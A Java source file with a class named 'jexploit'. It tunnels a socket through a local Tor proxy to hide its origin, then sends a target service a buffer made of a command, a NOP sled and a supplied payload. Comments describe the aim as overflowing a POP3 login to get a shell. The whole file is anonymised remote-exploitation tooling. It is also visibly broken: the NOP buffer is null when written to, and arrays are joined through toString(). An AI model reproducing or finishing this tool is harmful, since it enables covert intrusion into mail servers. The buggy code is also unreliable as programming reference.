package frontline;





import java.net.*;
import java.io.*;

// exploit class uses tor onion.


public class jexploit
 {

	
// ========== private=========================	
private String m_Host;
private String m_Buffer;
private int m_Port;
private Socket m_socket;  
private InetAddress m_inetAddr; 
private  DataOutputStream m_os; 

// tor proxy
InetSocketAddress HiddenerProxyAddress;
Proxy HiddenProxy;
//Socket underlying;
SocketAddress sa;

private void Connect(InetAddress adress,int port)
{
	m_inetAddr=adress;
m_Port=port;

HiddenerProxyAddress = new InetSocketAddress("127.0.0.1", 9150);
HiddenProxy = new Proxy(Proxy.Type.SOCKS, HiddenerProxyAddress);
m_socket  = new Socket(HiddenProxy);
sa = new InetSocketAddress(m_inetAddr,m_Port);//                         "www.facebook.com", 80);
try {
	m_socket.connect(sa);
} catch (IOException e) {
	// TODO Auto-generated catch block
	e.printStackTrace();
}
		
	

/*
	
	  try {
		m_socket = new Socket(m_inetAddr, m_Port);
	} catch (UnknownHostException e) {
		// TODO Auto-generated catch block
		e.printStackTrace();
	} catch (IOException e) {
		// TODO Auto-generated catch block
		e.printStackTrace();
	}
*/
	  
	  
	  
	  
	  System.out.println("Connected");




}








// ================= public ===================
jexploit()
{
m_Host=null;
m_Buffer=null;
m_Port=0;
m_socket=null;  
m_inetAddr=null;
m_os=null;


}





public String IPtoHostname(InetAddress  IP)
{
	m_inetAddr=IP;
	
	
m_Host=	m_inetAddr.getHostName();
	//  System.out.println(host);	
	return m_Host;
}

public String HostnameToIP(String hostname)
{

	try {
		m_inetAddr= InetAddress.getByName(hostname);
	} catch (UnknownHostException e) {
		// TODO Auto-generated catch block
		e.printStackTrace();
	}
	
m_Host=	m_inetAddr.getHostAddress();
return m_Host;

}


/*
 
 
  

Easiest way to do it with javax.xml.bind.DatatypeConverter:

    String hex = "75546f7272656e745c436f6d706c657465645c6e667375635f6f73745f62795f6d757374616e675c50656e64756c756d2d392c303030204d696c65732e6d7033006d7033006d7033004472756d202620426173730050656e64756c756d00496e2053696c69636f00496e2053696c69636f2a3b2a0050656e64756c756d0050656e64756c756d496e2053696c69636f303038004472756d2026204261737350656e64756c756d496e2053696c69636f30303800392c303030204d696c6573203c4d757374616e673e50656e64756c756d496e2053696c69636f3030380050656e64756c756d50656e64756c756d496e2053696c69636f303038004d50330000";
    byte[] s = DatatypeConverter.parseHexBinary(hex);
    System.out.println(new String(s));


  
  
  
  
 */




public void RunExploit(InetAddress adress,int port,String Service,char[] payload,int numberofNops)
{
	

Connect(adress,port);
// socket send......
// test return values....
// shell.
try {
	m_os = new DataOutputStream(m_socket.getOutputStream());
} catch (IOException e) {
	// TODO Auto-generated catch block
	e.printStackTrace();
}


// write to socket
// ========================
// 1:send pop3 login
// 2:send 200 nops
// 3:send payload = shell and socket server. ftp server.
char[] nopbuffer = null;
for(int i=0;i<=numberofNops;i++)
	nopbuffer[i]= 0x90;

//String commandbuffer= "USER "+nopbuffer+m_Buffer;;
//m_Buffer=Service + nopbuffer + payload;
m_Buffer= (String)Service +(String)nopbuffer.toString() + (String)payload.toString();



// 1=commandbuffer,2=nopbuffer,3=m_Buffer(payload)
// simple exploit.

// section 1: pop3 protocol attack
// ===================
// C=client, S=server.
//Examples:
//    C: USER mrose
//    S: +OK mrose is a real hoopy frood
//    C: PASS secret
//    S: -ERR maildrop already locked
// exploit pass is likely the best thing todo.....pop3 has so many keywords so a ttack on this protocol i think is sucessfull.






try {
	m_os.writeUTF(m_Buffer);                //m_Buffer.toString());
} catch (IOException e) {
	// TODO Auto-generated catch block
	e.printStackTrace();
}







// close connection
try {
	m_os.close();
} catch (IOException e) {
	// TODO Auto-generated catch block
	e.printStackTrace();
}

// exploit send.



}







}  // end class


